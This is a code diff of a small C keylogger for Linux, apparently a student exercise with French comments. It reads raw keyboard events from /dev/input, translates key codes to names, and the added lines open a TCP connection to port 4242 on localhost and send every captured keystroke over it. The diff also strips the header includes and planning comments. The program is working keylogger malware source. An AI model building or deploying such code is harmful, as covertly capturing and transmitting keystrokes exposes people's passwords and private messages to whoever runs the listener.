@@ -1,13 +1,4 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <linux/input.h>
-#include <sys/select.h>
-#include <errno.h>
-#include <string.h>
 #include "gnl.h"
-#include <stdbool.h>
 
 const char *keymap[] = {
     [KEY_A] = "A", [KEY_B] = "B", [KEY_C] = "C", [KEY_D] = "D",
@@ -49,6 +40,22 @@ const char *keymap[] = {
 
 void read_event(char *event)
 {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("socket client");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(4242);
+    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
+
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("connection au serveur échouée");
+        exit(EXIT_FAILURE);
+    }
+
     char *device = malloc(sizeof(char *) * (strlen(event) + strlen("/dev/input/")) + 1);
     strcpy(device, "/dev/input/");
     strcat(device,event);
@@ -77,7 +84,11 @@ void read_event(char *event)
                 if (ev.type == EV_KEY && ev.value == 1) 
                 {
                     const char *key = keymap[ev.code];
-                    if (key) {
+                    if (key) 
+                    {
+                        char buffer[64];
+                        snprintf(buffer, sizeof(buffer), "[%s]", key);
+                        send(sock, buffer, strlen(buffer), 0);
                         printf("[%ld.%06ld][%s]\n", ev.time.tv_sec, ev.time.tv_usec, key);
                     } else {
                         printf("[%ld.%06ld][UNKNOWN CODE: %d]\n", ev.time.tv_sec, ev.time.tv_usec, ev.code);
@@ -90,6 +101,7 @@ void read_event(char *event)
         }
     }
     close(fd);
+    close(sock);
 }
 
 static int	get_file_len(int fd)
@@ -174,19 +186,6 @@ char *parse_device_name()
 
 
 int main() {
-
-
-    //          PARTIE 1 : Recuperer l'info sur quel event fichier ce trouve le clavier 
-    // ouvrir le fichier /proc/bus/input/devices
-    // chercher dans ce dernier le fichier event correspondant a mon clavier.
-    // Recuperner N: Name= et verifier si le mots KEYBOARD est dans le nom
-    // Si Oui Allez dans H: Handlers et recuperer le numero d'event. 
-    // Si non passez a la suite.
-    //          PARTIE 2 : Lire le contenu de event
-    // Ouvrir le fichier /dev/input/event
-    // lire le contenu de ce dernier 
-    // passer ce contenu a la fonction
-    //          PARTIE 3 : Traduire ce contenu et le stocker dans un fichier en local
     read_event(parse_device_name());
     return 0;
 }
